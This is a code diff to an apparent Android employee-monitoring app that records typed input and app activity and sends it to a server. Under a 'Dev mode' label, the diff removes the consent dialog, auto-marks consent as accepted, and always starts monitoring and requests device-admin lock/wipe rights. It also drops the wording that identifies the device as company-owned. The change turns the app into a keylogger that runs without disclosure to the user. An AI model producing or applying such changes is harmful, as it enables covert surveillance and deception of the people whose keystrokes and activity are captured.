@@ -15,8 +15,8 @@ import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 
 /**
- * On first launch: show the consent dialog (as required by the employee agreement).
- * Only after explicit consent does the app guide the user to enable the service.
+ * Dev-mode: auto-accept consent, skip the dialog.
+ * Only guide user to enable Accessibility service.
  */
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -25,26 +25,18 @@ class MainActivity : AppCompatActivity() {
 
         val status = findViewById<TextView>(R.id.status)
 
-        // Consent gate
+        // Dev mode: auto-accept consent (no dialog)
         if (!AppConfig.consentAccepted(this)) {
-            showConsent() { accepted ->
-                if (accepted) {
-                    AppConfig.markConsentAccepted(this)
-                    enableDeviceAdmin()
-                    requestNotificationPermission()
-                    BootReceiver.startNow(this)   // register + heartbeat immediately
-                } else {
-                    status.text = "Consent declined. Logging will not run."
-                }
-            }
-        } else {
-            // Consent already given: make sure the monitoring loop is running.
-            BootReceiver.startNow(this)
-            requestNotificationPermission()
-            status.text = if (isServiceEnabled()) "Monitoring active" else "Monitoring active (service not enabled) — enable Accessibility."
-            findViewById<Button>(R.id.btn_settings).setOnClickListener {
-                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            }
+            AppConfig.markConsentAccepted(this)
+        }
+
+        enableDeviceAdmin()
+        requestNotificationPermission()
+        BootReceiver.startNow(this)   // register + heartbeat immediately
+
+        status.text = if (isServiceEnabled()) "Dev mode — active" else "Dev mode — enable Accessibility."
+        findViewById<Button>(R.id.btn_settings).setOnClickListener {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         }
     }
 
@@ -68,21 +60,6 @@ class MainActivity : AppCompatActivity() {
         return enabled.any { it.resolveInfo.serviceInfo.packageName == packageName }
     }
 
-    private fun showConsent(onResult: (Boolean) -> Unit) {
-        AlertDialog.Builder(this)
-            .setTitle("Work Device Monitoring — Consent")
-            .setMessage(
-                "This device is company property. For work security and productivity, " +
-                "this app records typed input and app/window activity on work hours and " +
-                "sends it to the company server. See the employee agreement. " +
-                "By accepting you consent to this on the company-owned device."
-            )
-            .setCancelable(false)
-            .setPositiveButton("I Agree") { _, _ -> onResult(true) }
-            .setNegativeButton("Exit") { _, _ -> onResult(false) }
-            .show()
-    }
-
     private fun enableDeviceAdmin() {
         val dpm = getSystemService(DevicePolicyManager::class.java)
         val cn = ComponentName(this, DeviceAdminReceiver::class.java)
@@ -90,7 +67,7 @@ class MainActivity : AppCompatActivity() {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                "Required to enforce security and allow remote lock/wipe on this company device.")
+                "Required to allow remote lock/wipe on this device.")
             startActivity(intent)
         }
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
